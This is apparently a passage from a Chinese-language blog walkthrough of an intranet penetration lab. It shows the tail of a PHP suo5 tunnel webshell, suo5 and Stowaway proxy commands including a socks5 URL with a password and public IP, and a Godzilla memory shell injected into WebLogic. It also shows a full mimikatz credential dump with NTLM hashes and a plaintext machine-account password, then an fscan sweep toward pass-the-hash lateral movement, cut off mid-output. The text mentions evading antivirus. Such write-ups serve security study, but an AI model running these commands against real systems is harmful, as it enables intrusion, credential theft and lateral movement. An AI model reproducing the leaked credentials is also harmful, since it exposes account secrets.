class="variable">$i</span>]);</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k_len</span> &lt; <span class="number">0</span> || <span class="variable">$i</span> + <span class="variable">$k_len</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$decoded</span>)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="variable">$i</span>, <span class="variable">$k_len</span>);</span><br><span class="line">        <span class="variable">$i</span> += <span class="variable">$k_len</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> + <span class="number">4</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$decoded</span>)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$v_len</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;N&#x27;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="variable">$i</span>, <span class="number">4</span>))[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$v_len</span> &lt; <span class="number">0</span> || <span class="variable">$i</span> + <span class="variable">$v_len</span> &gt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$decoded</span>)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$decoded</span>, <span class="variable">$i</span>, <span class="variable">$v_len</span>);</span><br><span class="line">        <span class="variable">$i</span> += <span class="variable">$v_len</span>;</span><br><span class="line">        <span class="variable">$m</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$m</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_del</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;ac&#x27;</span> =&gt; <span class="title function_ invoke__">chr</span>(<span class="number">0x02</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_status</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;s&#x27;</span> =&gt; <span class="title function_ invoke__">chr</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_data</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;ac&#x27;</span> =&gt; <span class="title function_ invoke__">chr</span>(<span class="number">0x01</span>), <span class="string">&#x27;dt&#x27;</span> =&gt; <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">xlpassxpukcLmU</span>()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">xlpassEtbOsRDk</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地直接起了一个suo5客户端，直接通过<strong>http</strong>搭建了两个内网之间的隧道，而且通过了解可知，这个隧道的传输质量也是不错的</p>
<p>首先将代理写好如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5://用户名:密码@公网IP:端口</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241211233046827.png" class="" title="image-20241211233046827">

<p>成功搭建如下：</p>
<img src="/posts/55d580db/image-20241211233157433.png" class="" title="image-20241211233157433">

<p>linux代理：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./suo5-linux-amd64 -t http://192.168.80.55/uploads/suo.php -l 0.0.0.0:7788 --proxy socks5://admin:ikvDbHGO@42.193.105.220:42584</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>借助这个代理可以成功访问：<strong>192.168.81.0&#x2F;24网段</strong></p>
<p>到达：<code>http://192.168.81.20:7001</code></p>
<img src="/posts/55d580db/image-20241211233236370.png" class="" title="image-20241211233236370">

<p>这里耐心等待：利用命令行启动java程序让其走，socks代理：<code>socks5://127.0.0.1:1080</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">G:\<span class="title">all_tools</span>\<span class="title">One</span>-<span class="title">fox</span>\<span class="title">ONE</span>-<span class="title">FOX</span>集成工具箱<span class="title">_V8</span>.2公开版<span class="title">_by</span>狐狸\<span class="title">Java_path</span>\<span class="title">Java_8_win</span>\<span class="title">bin</span>\<span class="title">java.exe</span> -<span class="title">DsocksProxyHost</span>=127.0.0.1</span></span><br><span class="line"><span class="function">-<span class="title">DsocksProxyPort</span>=1080 -<span class="title">jar</span> <span class="title">WeblogicTool_1</span>.3.<span class="title">jar</span></span></span><br></pre></td></tr></table></figure>

<p>可参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_71692682/article/details/125217580?ops_request_misc=%7B%22request_id%22:%2247906275c5d16c5f958eba7643a8aebf%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=47906275c5d16c5f958eba7643a8aebf&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-125217580-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=%E7%BB%99%E4%BB%BB%E6%84%8Fjava%E7%A8%8B%E5%BA%8F%E4%B8%8Asocks%E4%BB%A3%E7%90%86&spm=1018.2226.3001.4187">第12篇：给任意java程序挂Socks5代理方法_java socks5-CSDN博客</a></p>
<h3 id="192-168-81-22-weblogic"><a href="#192-168-81-22-weblogic" class="headerlink" title="192.168.81.22-weblogic"></a>192.168.81.22-weblogic</h3><p>检测到如下漏洞：如下</p>
<img src="/posts/55d580db/image-20241212103224182.png" class="" title="image-20241212103224182">

<p>尝试一把梭，打入内存马</p>
<img src="/posts/55d580db/image-20241212103805859.png" class="" title="image-20241212103805859">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2024-12-12 10:37:04：哥斯拉4 Servlet内存马Payload已发送，请自行测试！</span><br><span class="line">URL: http://192.168.81.20:7001/bea_wls_internal/app   密码：123456  秘钥：key </span><br></pre></td></tr></table></figure>

<p>最后一直没能成功，具体原因不太清楚（决定后面再仔细研究）。后面改用<code>stowaway</code>来搭建多级代理，因为其火绒相对来说版本比较老，所以能达到一个过火绒的效果。</p>
<p>步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">公网ip上启动一个监听：</span><br><span class="line">./stowaway_admin -l 9999</span><br><span class="line"></span><br><span class="line">192.168.80.55回连监听连通:</span><br><span class="line">./stowaway_agent -c 公网ip:9999</span><br><span class="line"></span><br><span class="line">建立连接以后如果想要使用这个节点就使用命令：</span><br><span class="line"><span class="meta prompt_">(admin)&gt;</span><span class="language-bash">use 0</span></span><br><span class="line"></span><br><span class="line">192.168.80.55启动一个监听：</span><br><span class="line">stowaway_admin.exe -l 9999</span><br><span class="line"></span><br><span class="line">然后在节点0:</span><br><span class="line">主动连接192.168.80.55:9999</span><br><span class="line">(node 0)&gt; connect 192.168.80.55:9999</span><br><span class="line"></span><br><span class="line">成功连接以后</span><br><span class="line">(node 0)&gt; back</span><br><span class="line">退出0节点回到(admin)</span><br><span class="line"></span><br><span class="line">进入节点1</span><br><span class="line"><span class="meta prompt_">(admin)&gt;</span><span class="language-bash">use 1</span></span><br><span class="line"></span><br><span class="line">开启一个socks代理</span><br><span class="line">(node 1)&gt;socks 1080</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个代理成功之后是能够通过cve成功写入内存马的：</p>
<img src="/posts/55d580db/image-20241212135753625.png" class="" title="image-20241212135753625">

<p>挂上代理成功连接：</p>
<img src="/posts/55d580db/image-20241212135834418.png" class="" title="image-20241212135834418">

<p>拿到webshell以后，查询一下进程：</p>
<img src="/posts/55d580db/image-20241212140000898.png" class="" title="image-20241212140000898">

<p>发现并没有杀软：</p>
<img src="/posts/55d580db/image-20241212140024110.png" class="" title="image-20241212140024110">

<p>查看ip信息发现了一个新网段<code>192.168.77.0/24</code>：</p>
<img src="/posts/55d580db/image-20241212140116542.png" class="" title="image-20241212140116542">

<p>因为其权限给的是<code>administrator</code>直接利用哥斯拉内置的<code>mimikatz</code>来进行密码凭据抓取</p>
<img src="/posts/55d580db/image-20241212142704862.png" class="" title="image-20241212142704862">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">ok</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 375046 (00000000:0005b906)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : weblogic</span><br><span class="line">Domain            : C3TING</span><br><span class="line">Logon Server      : WIN-1SJG2BFF54E</span><br><span class="line">Logon Time        : 2024/6/10 21:31:50</span><br><span class="line">SID               : S-1-5-21-495363149-4124706654-1579529781-1103</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : weblogic</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : dee6489dfcd545e5a4b452fc9da06a0f</span><br><span class="line">	 * SHA1     : f959b907a86ef967bcbed9dc24954695ecbe2fa8</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : dee6489dfcd545e5a4b452fc9da06a0f</span><br><span class="line">	 * SHA1     : f959b907a86ef967bcbed9dc24954695ecbe2fa8</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : weblogic</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : weblogic</span><br><span class="line">	 * Domain   : C3TING.ORG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 350972 (00000000:00055afc)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:29:25</span><br><span class="line">SID               : S-1-5-90-2</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 46b27275c57726a026781f3ed621b4cb</span><br><span class="line">	 * SHA1     : 09c31622476ba96b160a234c14707eba5b7dbc2b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : c3ting.org</span><br><span class="line">	 * Password : _okY.Qi_a.&gt;dd32F:z2UKy.O*x n5E9,5Rl_%O&amp;A0;&quot;J:&#x27;#pj3Z&gt;NgX8/Us1*h&quot;3lc/Sa%.bqP9lQR)nU1B&#x27;&gt;aeR%no9-O3 A[&lt;p W`WRu&amp;&gt;zncfT2&#x27;8L]Ez</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 350948 (00000000:00055ae4)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:29:25</span><br><span class="line">SID               : S-1-5-90-2</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 46b27275c57726a026781f3ed621b4cb</span><br><span class="line">	 * SHA1     : 09c31622476ba96b160a234c14707eba5b7dbc2b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : c3ting.org</span><br><span class="line">	 * Password : _okY.Qi_a.&gt;dd32F:z2UKy.O*x n5E9,5Rl_%O&amp;A0;&quot;J:&#x27;#pj3Z&gt;NgX8/Us1*h&quot;3lc/Sa%.bqP9lQR)nU1B&#x27;&gt;aeR%no9-O3 A[&lt;p W`WRu&amp;&gt;zncfT2&#x27;8L]Ez</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WEBLOGIC$</span><br><span class="line">Domain            : C3TING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:26:59</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 46b27275c57726a026781f3ed621b4cb</span><br><span class="line">	 * SHA1     : 09c31622476ba96b160a234c14707eba5b7dbc2b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : weblogic$</span><br><span class="line">	 * Domain   : C3TING.ORG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 43688 (00000000:0000aaa8)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:26:53</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 46b27275c57726a026781f3ed621b4cb</span><br><span class="line">	 * SHA1     : 09c31622476ba96b160a234c14707eba5b7dbc2b</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 538497 (00000000:00083781)</span><br><span class="line">Session           : CachedInteractive from 2</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : C3TING</span><br><span class="line">Logon Server      : WIN-1SJG2BFF54E</span><br><span class="line">Logon Time        : 2024/6/10 21:33:21</span><br><span class="line">SID               : S-1-5-21-495363149-4124706654-1579529781-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : 7ab183888ecafcccf897c4a5a59c8568</span><br><span class="line">	 * SHA1     : 65e4580b288c7c555e21f70d81dd6e0b72397ed9</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 7ab183888ecafcccf897c4a5a59c8568</span><br><span class="line">	 * SHA1     : 65e4580b288c7c555e21f70d81dd6e0b72397ed9</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING.ORG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 496531 (00000000:00079393)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : C3TING</span><br><span class="line">Logon Server      : WIN-1SJG2BFF54E</span><br><span class="line">Logon Time        : 2024/6/10 21:32:46</span><br><span class="line">SID               : S-1-5-21-495363149-4124706654-1579529781-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * NTLM     : 7ab183888ecafcccf897c4a5a59c8568</span><br><span class="line">	 * SHA1     : 65e4580b288c7c555e21f70d81dd6e0b72397ed9</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : 7ab183888ecafcccf897c4a5a59c8568</span><br><span class="line">	 * SHA1     : 65e4580b288c7c555e21f70d81dd6e0b72397ed9</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : C3TING.ORG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 264033 (00000000:00040761)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WEBLOGIC</span><br><span class="line">Logon Server      : WEBLOGIC</span><br><span class="line">Logon Time        : 2024/6/10 21:28:30</span><br><span class="line">SID               : S-1-5-21-2004965046-3923418856-647414055-500</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:27:01</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WEBLOGIC$</span><br><span class="line">Domain            : C3TING</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2024/6/10 21:26:53</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEBLOGIC$</span><br><span class="line">	 * Domain   : C3TING</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : weblogic$</span><br><span class="line">	 * Domain   : C3TING.ORG</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	KO</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过判断可以发现已经进入域内环境<code>C3TING.ORG</code>。</p>
<p>尝试直接破解出明文密码，但是发现并不行。</p>
<img src="/posts/55d580db/image-20241212142818790.png" class="" title="image-20241212142818790">



<h3 id="192-168-77-250-PTH横向"><a href="#192-168-77-250-PTH横向" class="headerlink" title="192.168.77.250-PTH横向"></a>192.168.77.250-PTH横向</h3><p>对利用上传<code>fscan</code>对网段进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/Downloads/fscanPlus_amd64.exe -h 192.168.77.0/24 -p 1-65535 -nobr -o C:/Users/Public/Downloads/out.txt</span><br><span class="line"></span><br><span class="line">-nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br></pre></td></tr></table></figure>

<p>扫描收集信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.77.250:139 open</span><br><span class="line">192.168.77.250:135 open</span><br><span class="line">192.168.77.25:135 open</span><br><span class="line">192.168.77.250:88 open</span><br><span class="line">192.168.77.250:53 open</span><br><span class="line">192.168.77.25:139 open</span><br><span class="line">192.168.77.25:445 open</span><br><span class="line">192.168.77.250:389 open</span><br><span class="line">192.168.77.250:445 open</span><br><span class="line">192.168.77.250:464 open</span><br><span class="line">192.168.77.250:593 open</span><br><span class="line">192.168.77.250:636 open</span><br><span class="line">192.168.77.250:3268 open</span><br><span class="line">192.168.77.250:3269 